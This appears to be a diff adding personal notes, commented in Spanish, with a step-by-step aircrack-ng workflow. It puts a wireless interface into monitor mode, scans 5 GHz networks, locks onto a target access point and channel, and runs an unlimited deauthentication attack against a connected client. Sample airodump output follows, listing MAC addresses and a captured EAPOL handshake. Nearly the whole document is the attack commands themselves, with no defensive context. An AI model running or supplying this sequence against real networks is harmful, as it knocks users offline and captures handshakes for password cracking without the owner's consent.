@@ -1,0 +1,27 @@
+// iwconfig
+export PATH=$PATH:/snap/wireless-tools/7/sbin
+
+//airmon-ng
+export PATH=$PATH:/usr/sbin
+
+//Activar modo monitor
+sudo airmon-ng start (interfaz de red)
+
+//Modo superusuario
+sudo su
+
+//Monitorear con frecuencia 5
+airodump-ng --band a (interfaz de red)
+
+//Copiar BSSID y canal 
+airodump-ng --band a -c (canal) --bssid (bssid) (interfaz de red)
+
+// Desautentificar 
+aireplay-ng -0 0 -a (BSSID) -c (STATION) (interfaz de red) 
+
+// Example
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ E4:C3:2A:10:2F:62  9A:FB:9A:DC:03:BC  -29    0 - 1      0     4973                                                                                    
+ E4:C3:2A:10:2F:62  B8:16:5F:90:FD:97  -53    1e- 1e     0     6108  EAPOL      
